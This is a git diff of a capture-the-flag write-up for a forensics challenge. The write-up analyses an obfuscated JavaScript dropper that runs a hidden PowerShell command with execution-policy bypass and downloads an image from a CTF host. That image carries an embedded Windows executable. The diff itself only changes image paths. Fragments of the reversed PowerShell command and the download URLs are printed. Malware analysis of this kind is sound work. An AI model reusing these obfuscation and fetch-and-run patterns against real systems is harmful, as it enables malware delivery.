@@ -11,7 +11,6 @@ categories: [CTF, University CTF 2023 Brains and Bytes]
 ## Forensics
 ### One Step Closer
 > Tasked with defending the antidote's research, a diverse group of students united against a relentless cyber onslaught. As codes clashed and defenses were tested, their collective effort stood as humanity's beacon, inching closer to safeguarding the research for the cure with every thwarted attack. A stealthy attack might have penetrated their defenses. Along with the Hackster's University students, analyze the provided file so you can detect this attack in the future. 
-{: .prompt-info }
 
 We are provided with vaccine.js file which is somehow obfuscated, so after analysing the file we come across a url `http://infected.human.htb/d/BKtQR`
 
@@ -34,7 +33,7 @@ StrReverse("'DxujWO$ dnammoc- eliforPoN- ssapyb ycilopnoitucexe- neddih elytswod
 The file was suspicious, hard to read and understand "obviously because it was written by the zombies" i decided to upload it to virus total and see the behaviour.
 
 
-![img-description](../img/brains-and-bytes/1.png)
+![img-description](/img/brains-and-bytes/1.png)
 
 Process 4080 reveals the command executed by the file. it is base64 encoded and so we decode it
 ```powershell
@@ -67,7 +66,7 @@ d5dff21b17ee-1f48-5c74-c934-d73c2a63=nekot&aidem=tla?txt.refsnart/o/moc.topsppa.
 
 From the script we see that its trying to download an image from this `http://infected.zombie.htb/WJveX71agmOQ6Gw_1698762642.jpg` url and so we try to get it using our docker ip and port
 
-![img-description](/assets/img/brains-and-bytes/2.png)
+![img-description](/img/brains-and-bytes/2.png)
 
 Next we use exiftool and find some interesting stuff.
 
@@ -99,14 +98,14 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 This was a very large base64 string. I took the string to cyber chef for a nice "zombie recipe"
 
-![img-description](/assets/img/brains-and-bytes/3.png)
+![img-description](/img/brains-and-bytes/3.png)
 
 We can see `MZ` meaning it is a windows executable file.So i decided to just continue scrolling and boom there's the cure to the zombie virus.
 
-![img-description](/assets/img/brains-and-bytes/4.png)
+![img-description](/img/brains-and-bytes/4.png)
 
 These zombies really used their BRAINS to BYTE the system.
 
-![yay](/assets/img/brains-and-bytes/joke.gif)
+![yay](/img/brains-and-bytes/joke.gif)
 
-![img-description](/assets/img/cert/HTB2023.png)
+![img-description](/img/cert/HTB2023.png)
